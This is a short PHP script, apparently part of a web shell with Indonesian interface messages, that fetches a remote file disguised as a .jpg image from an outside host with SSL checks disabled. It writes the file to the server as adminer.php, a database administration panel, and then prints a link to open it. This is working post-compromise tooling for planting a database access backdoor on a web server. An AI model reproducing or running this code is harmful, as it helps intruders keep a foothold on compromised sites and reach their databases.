<?php
$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
	function adminer($url, $isi) {
		$fp = fopen($isi, "w");
		$ch = curl_init();
		 	  curl_setopt($ch, CURLOPT_URL, $url);
		 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		   	  curl_setopt($ch, CURLOPT_FILE, $fp);
		return curl_exec($ch);
		   	  curl_close($ch);
		fclose($fp);
		ob_flush();
		flush();
	}
	if(file_exists('adminer.php')) {
		echo "<center><font color=lime>Sudah Berhasil Membuat adminer </a></font><br><br><center><a href='adminer.php' target='_blank' class='btn cta'>Buka Adminernya </a></center>";
	} else {
		if(adminer("https://cdn.via.com/static/img/v1/newui/ph/general/1587067892393_adm.jpg","adminer.php")) {
			echo "<br><br><center><a href='adminer.php' target='_blank' class='btn cta'>Buka Adminernya </a></center>";
		} else {
			echo "<br><br><center><font color=red>gagal buat file adminer</font></center>";
		}
	}
?>
